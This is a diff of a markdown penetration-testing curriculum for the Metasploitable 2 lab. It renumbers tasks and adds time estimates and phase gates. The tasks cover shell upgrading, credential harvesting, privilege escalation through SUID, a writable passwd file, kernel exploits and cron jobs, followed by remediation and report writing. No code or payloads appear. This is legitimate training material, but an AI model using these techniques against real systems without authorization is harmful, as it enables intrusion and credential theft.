+| **Tools Used** | Your notes editor. Reference your saved terminal transcripts and Metasploit outputs from previous tasks. |
+| **Expected Output** | A comparison document covering: (1) Which exploits were easier manually vs with Metasploit and why, (2) What you understood better after manual exploitation, (3) When you would choose each approach in a real engagement. Minimum 1 page. |
+| **Difficulty** | ⭐⭐ Beginner-Intermediate |
+| **Save These** | The reflection document. This demonstrates methodology understanding — valuable for interviews and report writing. |
+| **Common Mistakes** | Writing a superficial "Metasploit is easier" summary. Not referencing specific exploits and what you learned from each. Not being honest about gaps in understanding. |
 
 ---
 
 # 👑 PHASE 4: POST-EXPLOITATION & PRIVILEGE ESCALATION
 
+> [!TIP]
+> **🚧 Phase Gate:** Before starting Phase 4, you should have: achieved root access via at least 3 different exploitation paths, completed manual exploitation without Metasploit for at least 2 services, and written a reflection document comparing manual vs automated approaches. If not, go back.
+>
+> **🔀 Prerequisite:** Task 3.5 (distccd) gives you a low-priv shell needed for privilege escalation practice in Level 6.
+
 ---
 
-## Level 8: Shell Mechanics & Lateral Awareness
+## Level 5: Shell Mechanics & Lateral Awareness
 
 *Master the art of upgrading, stabilizing, and operating within compromised shells.*
 
 ---
 
-### Task 8.1 — Shell Upgrade: Raw to Interactive TTY
+### Task 4.1 — Shell Upgrade: Raw to Interactive TTY
 
-- [ ] **Completed**
+⏱️ **~1h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -681,9 +626,9 @@
 
 ---
 
-### Task 8.2 — File Transfer Techniques
+### Task 4.2 — File Transfer Techniques
 
-- [ ] **Completed**
+⏱️ **~1.5h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -697,9 +642,9 @@
 
 ---
 
-### Task 8.3 — Service Credential Harvesting & Reuse
+### Task 4.3 — Service Credential Harvesting & Reuse
 
-- [ ] **Completed**
+⏱️ **~1.5h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -713,15 +658,15 @@
 
 ---
 
-## Level 9: Privilege Escalation
+## Level 6: Privilege Escalation
 
 *Elevate from low-privilege shells to root using multiple different techniques.*
 
 ---
 
-### Task 9.1 — SUID Binary Exploitation (nmap interactive)
+### Task 4.4 — SUID Binary Exploitation (nmap interactive)
 
-- [ ] **Completed**
+⏱️ **~1h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -735,9 +680,9 @@
 
 ---
 
-### Task 9.2 — Writable /etc/passwd & Shadow File Exploitation
+### Task 4.5 — Writable /etc/passwd & Shadow File Exploitation
 
-- [ ] **Completed**
+⏱️ **~1h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -751,9 +696,9 @@
 
 ---
 
-### Task 9.3 — Kernel Exploit Research & Execution
+### Task 4.6 — Kernel Exploit Research & Execution
 
-- [ ] **Completed**
+⏱️ **~2h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -767,9 +712,9 @@
 
 ---
 
-### Task 9.4 — Cron Job & Service Misconfiguration Exploitation
+### Task 4.7 — Cron Job & Service Misconfiguration Exploitation
 
-- [ ] **Completed**
+⏱️ **~1.5h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -785,17 +730,20 @@
 
 # 🛡️ PHASE 5: DEFENSE, REPORTING & MASTERY
 
+> [!TIP]
+> **🚧 Phase Gate:** Before starting Phase 5, you should have: upgraded a raw shell to a full TTY, transferred files using at least 3 methods, harvested credentials from config files, and escalated privileges via at least 2 different techniques (SUID, writable passwd, kernel, or cron). If not, go back.
+
 ---
 
-## Level 10: Post-Exploitation Intelligence
+## Level 7: Post-Exploitation Intelligence
 
 *With root access secured through multiple paths, extract maximum intelligence and build the complete attack narrative.*
 
 ---
 
-### Task 10.1 — System-Wide Credential Harvesting
+### Task 5.1 — System-Wide Credential Harvesting
 
-- [ ] **Completed**
+⏱️ **~2h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -809,9 +757,9 @@
 
 ---
 
-### Task 10.2 — Complete Attack Graph Construction
+### Task 5.2 — Complete Attack Graph Construction
 
-- [ ] **Completed**
+⏱️ **~2h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -825,15 +773,15 @@
 
 ---
 
-## Level 11: Defensive Analysis & Remediation
+## Level 8: Defensive Analysis & Remediation
 
 *Switch to the defender's perspective. For every vulnerability exploited, define the fix.*
 
 ---
 
-### Task 11.1 — Service-by-Service Remediation Plan
+### Task 5.3 — Service-by-Service Remediation Plan
 
-- [ ] **Completed**
+⏱️ **~2h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -847,9 +795,12 @@
 
 ---
 
-### Task 11.2 — Firewall Rule Design
+### Task 5.4 — Firewall Rule Design *(Review Scope)*
 
-- [ ] **Completed**
+⏱️ **~2h max** · - [ ] **Completed**
+
+> [!NOTE]
+> Time-box this to 2 hours. The goal is to understand egress filtering and default-deny concepts, not become an iptables expert. The OWASP BWA lab covers Apache hardening, which complements this.
 
 | Field | Detail |
 |:---|:---|
@@ -863,15 +814,15 @@
 
 ---
 
-## Level 12: Hard Mode Challenges
+## Level 9: Hard Mode Challenges
 
 *Re-compromise the target under artificial constraints to test mastery and develop professional-grade reporting skills.*
 
 ---
 
-### Task 12.1 — No-Metasploit Full Compromise
+### Task 5.5 — No-Metasploit Full Compromise
 
-- [ ] **Completed**
+⏱️ **~4h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -885,29 +836,29 @@
 
 ---
 
-### Task 12.2 — Constrained Entry Point Challenges
+### Task 5.6 — Constrained Entry Point Challenge (Web-Only)
 
-- [ ] **Completed**
+⏱️ **~3h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
-| **Objective** | Complete three separate compromise runs, each starting from a different constrained entry point: (A) web-only (ports 80/8180), (B) network services only (no web), (C) UDP-discovered services only. |
-| **Skills Learned** | Adaptability, creative exploitation under constraints, understanding that real engagements often have limited attack surface, developing multiple methodologies. |
-| **Tools Used** | Varies per constraint. |
-| **Expected Output** | Three separate compromise write-ups, each documenting the constrained path from initial access to root. |
+| **Objective** | Complete a full compromise run starting from a constrained entry point: **web-only (ports 80/8180)**. No direct network service exploitation allowed. You must reach root using only web-based attack vectors and post-exploitation from web shells. |
+| **Skills Learned** | Adaptability, creative exploitation under constraints, understanding that real engagements often have limited attack surface, developing web-centric attack methodology. |
+| **Tools Used** | Browser, `curl`, `gobuster`, `nikto`, `burpsuite`. No direct service exploits (FTP, SSH, SMB, etc.). |
+| **Expected Output** | A single comprehensive write-up documenting the constrained web-only path from initial access to root. |
 | **Difficulty** | ⭐⭐⭐⭐⭐ Advanced |
-| **Save These** | All three write-ups. Reflection comparing the difficulty and approach of each constraint. |
-| **Common Mistakes** | Accidentally using a non-allowed entry point. Not resetting the VM between runs. Not documenting the constraint clearly in the write-up. |
+| **Save These** | The complete write-up. Reflection on how the constraint forced creative thinking. |
+| **Common Mistakes** | Accidentally using a non-allowed entry point. Not resetting the VM before starting. Not documenting the constraint clearly in the write-up. |
 
 ---
 
-### Task 12.3 — Professional Penetration Test Report
+### Task 5.7 — Professional Penetration Test Report
 
-- [ ] **Completed**
+⏱️ **~4h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
-| **Objective** | Write a professional-grade penetration test report covering your entire Metasploitable 2 assessment. Follow a real report structure: Executive Summary, Scope, Methodology, Findings (with CVSS scores), Evidence, Remediation, and Appendices. Time-box the entire process to 3 hours. |
+| **Objective** | Write a professional-grade penetration test report covering your entire Metasploitable 2 assessment. Follow a real report structure: Executive Summary, Scope, Methodology, Findings (with CVSS scores), Evidence, Remediation, and Appendices. Time-box the entire process to 4 hours. If you've also completed the OWASP BWA lab, write a **combined report** covering both labs as one unified assessment. |
 | **Skills Learned** | Professional report writing, executive vs technical audience communication, CVSS scoring, evidence presentation, the difference between a vulnerability list and a pentest report. |
 | **Tools Used** | Markdown/Word/LaTeX editor. CVSS Calculator (FIRST.org). Your accumulated notes and screenshots. |
 | **Expected Output** | A complete penetration test report (10+ pages) that you could present to a hypothetical client. Includes: executive summary (1 page, non-technical), methodology, at least 10 findings with CVSS scores, evidence screenshots, and prioritized remediation recommendations. |
@@ -921,9 +872,9 @@
 
 | Phase | Status |
 |:---|:---:|
-| Phase 1: Foundation & Lab Setup (Tasks 0.1–1.5) | ☐ |
-| Phase 2: Deep Enumeration (Tasks 2.1–3.5) | ☐ |
-| Phase 3: Exploitation Core (Tasks 4.1–7.3) | ☐ |
-| Phase 4: Post-Exploitation & PrivEsc (Tasks 8.1–9.4) | ☐ |
-| Phase 5: Defense, Reporting & Mastery (Tasks 10.1–12.3) | ☐ |
-| **All 73 Tasks Complete** | ☐ |
+| Phase 1: Foundation & Lab Setup (Tasks 0.1–1.4) | ☐ |
+| Phase 2: Deep Enumeration (Tasks 2.1–2.10 + Bonus 2.5) | ☐ |
+| Phase 3: Exploitation Core (Tasks 3.1–3.12 + Bonus 3.6, 3.9) | ☐ |
+| Phase 4: Post-Exploitation & PrivEsc (Tasks 4.1–4.7) | ☐ |
+| Phase 5: Defense, Reporting & Mastery (Tasks 5.1–5.7) | ☐ |
+| **All 53 Tasks Complete** (+ 3 Bonus) | ☐ |
